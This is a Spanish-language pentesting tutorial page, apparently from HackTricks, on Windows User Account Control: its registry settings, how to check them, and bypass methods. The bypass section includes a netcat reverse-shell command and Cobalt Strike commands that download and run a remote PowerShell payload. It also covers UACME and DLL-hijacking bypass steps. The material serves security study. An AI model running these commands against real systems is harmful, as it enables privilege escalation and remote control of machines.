# UAC - Control de Cuentas de Usuario

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** con las herramientas comunitarias más avanzadas del mundo.\
Obtén acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[Control de Cuentas de Usuario (UAC)](https://docs.microsoft.com/es-es/windows/security/identity-protection/user-account-control/how-user-account-control-works) es una característica que permite un **prompt de consentimiento para actividades elevadas**. Las aplicaciones tienen diferentes niveles de `integridad`, y un programa con un **nivel alto** puede realizar tareas que **podrían comprometer el sistema**. Cuando UAC está habilitado, las aplicaciones y tareas siempre se **ejecutan bajo el contexto de seguridad de una cuenta de usuario no administrador**, a menos que un administrador autorice explícitamente que estas aplicaciones/tareas tengan acceso de nivel de administrador para ejecutarse en el sistema. Es una característica de conveniencia que protege a los administradores de cambios no deseados, pero no se considera un límite de seguridad.

Para obtener más información sobre los niveles de integridad:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

Cuando UAC está en su lugar, a un usuario administrador se le asignan 2 tokens: una clave de usuario estándar, para realizar acciones regulares como nivel regular, y otra con los privilegios de administrador.

Esta [página](https://docs.microsoft.com/es-es/windows/security/identity-protection/user-account-control/how-user-account-control-works) analiza en profundidad cómo funciona UAC e incluye el proceso de inicio de sesión, la experiencia del usuario y la arquitectura de UAC. Los administradores pueden utilizar políticas de seguridad para configurar cómo funciona UAC específicamente para su organización a nivel local (usando secpol.msc), o configuradas y distribuidas a través de Objetos de Directiva de Grupo (GPO) en un entorno de dominio de Active Directory. Los diversos ajustes se discuten en detalle [aquí](https://docs.microsoft.com/es-es/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Hay 10 ajustes de Directiva de Grupo que se pueden configurar para UAC. La siguiente tabla proporciona detalles adicionales:

| Ajuste de Directiva de Grupo                                                                                                                                                                                                                                                                                                                                                   | Clave del Registro           | Configuración predeterminada                                  |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Control de Cuentas de Usuario: Modo de aprobación de administrador para la cuenta de administrador integrada](https://docs.microsoft.com/es-es/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Deshabilitado                                                     |
| [Control de Cuentas de Usuario: Permitir que las aplicaciones de UIAccess soliciten elevación sin usar el escritorio seguro](https://docs.microsoft.com/es-es/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Deshabilitado                                                     |
| [Control de Cuentas de Usuario: Comportamiento del cuadro de diálogo de elevación para administradores en el modo de aprobación de administrador](https://docs.microsoft.com/es-es/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Solicitar consentimiento para binarios que no sean de Windows                  |
| [Control de Cuentas de Usuario: Comportamiento del cuadro de diálogo de elevación para usuarios estándar](https://docs.microsoft.com/es-es/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Solicitar credenciales en el escritorio seguro                 |
| [Control de Cuentas de Usuario: Detectar instalaciones de aplicaciones y solicitar elevación](https://docs.microsoft.com/es-es/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Habilitado (predeterminado para el hogar) Deshabilitado (predeterminado para la empresa) |
| [Control de Cuentas de Usuario: Solo elevar ejecutables que estén firmados y validados](https://docs.microsoft.com/es-es/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Deshabilitado                                                     |
| [Control de Cuentas de Usuario: Solo elevar aplicaciones de UIAccess que estén instaladas en ubicaciones seguras](https://docs.microsoft.com/es-es/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Habilitado                                                      |
| [Control de Cuentas de Usuario: Ejecutar a todos los administradores en el modo de aprobación de administrador](https://docs.microsoft.com/es-es/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Habilitado                                                      |
| [Control de Cuentas de Usuario: Cambiar al escritorio seguro al solicitar elevación](https://docs.microsoft.com/es-es/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Habilitado                                                      |
| [Control de cuentas de usuario: Virtualizar errores de escritura de archivos y registros en ubicaciones por usuario](https://docs.microsoft.com/es-es/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Habilitado                                                      |

### Teoría de Bypass de UAC

Algunos programas se **autoelevan automáticamente** si el **usuario pertenece** al **grupo de administradores**. Estos binarios tienen dentro de sus _**Manifiestos**_ la opción _**autoElevate**_ con el valor _**True**_. El binario también debe estar **firmado por Microsoft**.

Entonces, para **bypassear** el **UAC** (elevar desde el nivel de integridad **medio** al nivel **alto**), algunos atacantes utilizan este tipo de binarios para **ejecutar código arbitrario** porque se ejecutará desde un proceso de **alto nivel de integridad**.

Puedes **verificar** el _**Manifiesto**_ de un binario utilizando la herramienta _**sigcheck.exe**_ de Sysinternals. Y puedes **ver** el **nivel de integridad** de los procesos utilizando _Process Explorer_ o _Process Monitor_ (de Sysinternals).

### Verificar UAC

Para confirmar si UAC está habilitado, realiza lo siguiente:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Si es **`1`**, entonces UAC está **activado**, si es **`0`** o **no existe**, entonces UAC está **inactivo**.

Luego, verifica **qué nivel** está configurado:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* Si **`0`**, entonces UAC no solicitará permisos (como **deshabilitado**)
* Si **`1`**, se le pedirá al administrador que ingrese el nombre de usuario y la contraseña para ejecutar el archivo binario con altos privilegios (en el Escritorio Seguro)
* Si **`2`** (**Siempre notificarme**), UAC siempre solicitará confirmación al administrador cuando intente ejecutar algo con altos privilegios (en el Escritorio Seguro)
* Si **`3`**, es similar a `1` pero no es necesario en el Escritorio Seguro
* Si **`4`**, es similar a `2` pero no es necesario en el Escritorio Seguro
* Si **`5`** (**predeterminado**), se le pedirá al administrador que confirme la ejecución de binarios no Windows con altos privilegios

Luego, debes verificar el valor de **`LocalAccountTokenFilterPolicy`**\
Si el valor es **`0`**, solo el usuario con RID 500 (**Administrador incorporado**) puede realizar tareas de administrador sin UAC, y si es `1`, **todas las cuentas dentro del grupo "Administradores"** pueden hacerlo.

Y finalmente, verifica el valor de la clave **`FilterAdministratorToken`**\
Si es **`0`** (predeterminado), la cuenta de Administrador incorporada puede realizar tareas de administración remota y si es **`1`**, la cuenta de Administrador incorporada **no puede** realizar tareas de administración remota, a menos que `LocalAccountTokenFilterPolicy` esté configurado en `1`.

#### Resumen

* Si `EnableLUA=0` o **no existe**, **no hay UAC para nadie**
* Si `EnableLua=1` y **`LocalAccountTokenFilterPolicy=1`**, no hay UAC para nadie
* Si `EnableLua=1` y **`LocalAccountTokenFilterPolicy=0` y `FilterAdministratorToken=0`**, no hay UAC para RID 500 (Administrador incorporado)
* Si `EnableLua=1` y **`LocalAccountTokenFilterPolicy=0` y `FilterAdministratorToken=1`**, UAC para todos

Toda esta información se puede obtener utilizando el módulo de **metasploit**: `post/windows/gather/win_privs`

También puedes verificar los grupos de tu usuario y obtener el nivel de integridad:
```
net user %username%
whoami /groups | findstr Level
```
## Bypass de UAC

{% hint style="info" %}
Ten en cuenta que si tienes acceso gráfico a la víctima, el bypass de UAC es sencillo, ya que simplemente puedes hacer clic en "Sí" cuando aparezca el mensaje de UAC.
{% endhint %}

El bypass de UAC es necesario en la siguiente situación: **el UAC está activado, tu proceso se está ejecutando en un contexto de integridad media y tu usuario pertenece al grupo de administradores**.

Es importante mencionar que es **mucho más difícil eludir el UAC si está en el nivel de seguridad más alto (Always) que si está en cualquiera de los otros niveles (Default)**.

### UAC desactivado

Si el UAC ya está desactivado (`ConsentPromptBehaviorAdmin` es **`0`**), puedes **ejecutar una shell inversa con privilegios de administrador** (nivel de integridad alto) utilizando algo como:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### Bypass de UAC con duplicación de token

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Bypass de UAC "muy" básico (acceso completo al sistema de archivos)

Si tienes una shell con un usuario que está dentro del grupo de Administradores, puedes **montar el recurso compartido C$** a través de SMB (sistema de archivos) localmente en un nuevo disco y tendrás **acceso a todo dentro del sistema de archivos** (incluso la carpeta de inicio del Administrador).

{% hint style="warning" %}
**Parece que este truco ya no funciona**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Bypass de UAC con Cobalt Strike

Las técnicas de Cobalt Strike solo funcionarán si UAC no está configurado en su nivel máximo de seguridad.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** y **Metasploit** también tienen varios módulos para **burlar** el **UAC**.

### KRBUACBypass

Documentación y herramienta en [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploits de bypass de UAC

[**UACME**](https://github.com/hfiref0x/UACME) es una **compilación** de varios exploits de bypass de UAC. Ten en cuenta que deberás **compilar UACME usando Visual Studio o msbuild**. La compilación creará varios ejecutables (como `Source\Akagi\outout\x64\Debug\Akagi.exe`), deberás saber **cuál necesitas**.\
Debes **tener cuidado** porque algunos bypasses **mostrarán alertas de otros programas** que **alertarán** al **usuario** de que algo está sucediendo.

UACME tiene la **versión de compilación desde la cual cada técnica comenzó a funcionar**. Puedes buscar una técnica que afecte a tus versiones:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
También, utilizando [esta](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) página obtienes la versión de Windows `1607` a partir de las versiones de compilación.

#### Más bypass de UAC

**Todas** las técnicas utilizadas aquí para eludir UAC **requieren** una **shell interactiva completa** con la víctima (una shell nc.exe común no es suficiente).

Puedes obtener una sesión de **meterpreter**. Migra a un **proceso** que tenga el valor de **Session** igual a **1**:

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_ debería funcionar)

### Bypass de UAC con GUI

Si tienes acceso a una **GUI, simplemente puedes aceptar la solicitud de UAC** cuando la recibas, realmente no necesitas eludirla. Por lo tanto, si tienes acceso a una GUI, podrás eludir UAC.

Además, si obtienes una sesión de GUI que alguien estaba usando (potencialmente a través de RDP), hay **herramientas que se ejecutarán como administrador** desde donde podrías ejecutar un **cmd** por ejemplo, **como administrador** directamente sin que UAC te lo solicite nuevamente, como [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Esto podría ser un poco más **sigiloso**.

### Bypass de UAC ruidoso por fuerza bruta

Si no te importa ser ruidoso, siempre puedes **ejecutar algo como** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) que **solicita elevar los permisos hasta que el usuario los acepte**.

### Tu propio bypass - Metodología básica de bypass de UAC

Si echas un vistazo a **UACME**, notarás que **la mayoría de los bypass de UAC abusan de una vulnerabilidad de Dll Hijacking** (principalmente escribiendo la dll maliciosa en _C:\Windows\System32_). [Lee esto para aprender cómo encontrar una vulnerabilidad de Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking.md).

1. Encuentra un binario que se **autoeleve** (verifica que cuando se ejecute, se ejecute con un nivel de integridad alto).
2. Con procmon, encuentra eventos de "**NAME NOT FOUND**" que puedan ser vulnerables a **Dll Hijacking**.
3. Probablemente necesitarás **escribir** la DLL dentro de algunas **rutas protegidas** (como C:\Windows\System32) donde no tienes permisos de escritura. Puedes eludir esto utilizando:
1. **wusa.exe**: Windows 7, 8 y 8.1. Permite extraer el contenido de un archivo CAB dentro de rutas protegidas (porque esta herramienta se ejecuta con un nivel de integridad alto).
2. **IFileOperation**: Windows 10.
4. Prepara un **script** para copiar tu DLL dentro de la ruta protegida y ejecutar el binario vulnerable y autoelevado.

### Otra técnica de bypass de UAC

Consiste en observar si un binario **autoelevado** intenta **leer** del **registro** el **nombre/ruta** de un **binario** o **comando** a ser **ejecutado** (esto es más interesante si el binario busca esta información dentro de **HKCU**).

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** con las herramientas comunitarias más avanzadas del mundo.\
Obtén acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
